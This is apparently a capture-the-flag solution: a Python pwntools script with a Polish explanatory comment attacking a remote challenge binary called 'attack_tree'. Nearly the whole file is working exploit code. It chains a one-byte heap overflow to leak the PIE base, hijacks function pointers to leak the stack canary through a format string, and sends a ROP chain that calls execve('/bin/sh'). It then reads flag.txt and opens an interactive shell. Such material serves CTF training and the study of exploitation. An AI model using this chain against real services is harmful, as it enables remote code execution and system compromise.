from pwn import *

'''
Flaga: flag{mylittleflaga}

Podatnosc 1:
mozna zrobic buffer overflow o 1 znak w node->content, a potem o dodatkowe kilka znakow ponad to i printujac drzewo
zleakwowac PIE offset. Wtedy tym samym sposobem mozna zamiast printera wstawic tam dowolny adres z naszej binarki.

Ja utworzylem nody i podmienilem im printery, tak ze printujac rekurencujnie drzewa wykonywalo sie:

1. read_line do bufora w funkcji print_subtree
2. printf na format stringu wczytanym (linijke wyzej) co pozwolilo zleakowac kanarka (odwolanie do arbitrary pozycji na stacku, znaleziona dzieki gdb)
3. main -- czyli po zleakowaniu kanarka wracamy do punktu wyjscia!

Potem jeszcze raz taka sama taktyka, tylko ze jedyna funkcja jaka wykonujemy to

1. read_line do bufora w funkcji print_subtree
i temu readline dajemy: padding na zapelnienie bufora, potem zleakowanego kanarka, a potem ROP exploit chain
i wykonuje sie piekne execve("/bin/sh")

Sporadycznie cos nie zadziala przy odpalaniu interacrive, dlatego dodany jest retry na calosc, zeby zawsze udalo sie dostac do shella.

Rozwiazanie wymaga zainstalowania pwntoolsow i posiadania binarki attack_tree
'''

def get_shell(r):
    elf = context.binary = ELF("./attack_tree")

    context.kernel = "amd64"

    a_64 = b"a" * 64
    # ------------
    payload = (
        b"1\n1\n" + a_64 + b"\n0\n"
        b"1\n1\n" + a_64 + b"\n0\n"
        b"1\n1.\n" + a_64 + b"\n0\n"
        b"1\n1.1.\n" + a_64 + b"\n0\n"
        b"1\n1.1.1.\n" + a_64 + b"\n0\n"
    )
    r.send(payload)
    r.recv()
    log.success("created nodes")

    # ------------- leak pie offset
    payload = b"3\n"
    r.send(payload)
    time.sleep(0.25)
    r.recvuntil(b"(OR) ")
    r.recvn(64)
    or_print_address_6b = r.recvn(6)
    if len(or_print_address_6b) != 6 or b'\n' in or_print_address_6b:
        raise ValueError('leaded address')
    or_print_address_8b = or_print_address_6b + b"\x00\x00"
    or_print_address_u64 = u64(or_print_address_8b)
    elf.address = or_print_address_u64 - elf.sym["or_print"]
    log.success("leaked pie offset")

    # -------------- leak canary value as pointer with arbitrary printf read
    fn_main_bytes = p64(elf.sym["main"])[:-2]
    fn_read_line_bytes = p64(elf.sym["read_line"])[:-2]
    fn_printf_bytes = p64(elf.sym["printf"])[:-2]
    payload = (
        b"2\n1.1.1.1.\n" + a_64 + fn_main_bytes + b"\n"
        b"2\n1.\n" + a_64 + fn_read_line_bytes + b"\n"
        b"2\n1.1.\n" + a_64 + fn_printf_bytes + b"\n"
        b"3\n" + b"%40$p %41$p " + b"\n"
    )
    r.recv()
    r.send(payload)
    time.sleep(0.33)
    r.recvuntil(b"0x")
    r.recvuntil(b"0x")
    canary_value = r.recvuntil(b" ").strip()
    canary_bytes = p64(int(canary_value, 16))
    if canary_bytes[0] != 0 or len(canary_bytes) != 8:
        raise ValueError('problem with canary')
    log.success("leaked canary")

    # --------------- ROP to execve /bin/sh
    payload = (
        b"2\n1.1.\n" + a_64 + or_print_address_6b + b"\n"
        b"2\n1.\n" + a_64 + or_print_address_6b + b"\n"
        b"2\n1.1.1.1.\n" + a_64 + fn_read_line_bytes + b"\n"
        b"3\n"
    )
    r.send(payload)

    rop = ROP(elf)
    bss = elf.bss()
    pop_rdi_ret = rop.rdi.address
    pop_rsi_ret = rop.rsi.address
    pop_rdx_ret = rop.rdx.address
    pop_rax_ret = rop.rax.address

    syscall = rop.syscall.address

    mov_qword_ptr_rdx_rax_ret = 0x31268 + elf.address  # wyciagniete ropgadgetem

    payload = b"a" * 0x48 + canary_bytes + p64(0)
    payload += p64(pop_rdx_ret)  # $rdx = .bss
    payload += p64(bss)
    payload += p64(pop_rax_ret)  # $rax = "/bin/sh"
    payload += b"/bin/sh\0"
    payload += p64(mov_qword_ptr_rdx_rax_ret)  # Store "/bin/sh" in .bss
    payload += p64(pop_rax_ret)  # $rax = 0x3b
    payload += p64(0x3B)
    payload += p64(pop_rdi_ret)  # $rdi = .bss (pointer to "/bin/sh")
    payload += p64(bss)
    payload += p64(pop_rsi_ret)  # $rsi = 0
    payload += p64(0)
    payload += p64(pop_rdx_ret)  # $rdx = 0
    payload += p64(0)
    payload += p64(syscall)

    payload += b"\n"

    r.recv(timeout=1)
    r.send(payload)
    time.sleep(0.5)
    r.recv()

    r.send(b"\ncat flag.txt\n")
    log.success("Flag: " + r.recv().strip().decode('latin-1'))

    log.success("got shell")

    r.interactive()


def main():
    while True:
        r = remote("pwn.var.tailcall.net", 30001)
        try:
            return get_shell(r)
        except (EOFError, UnicodeDecodeError) as e:
            r.close()
            log.warning("A recoverable problem occured, we'll try again")
            time.sleep(1)


main()
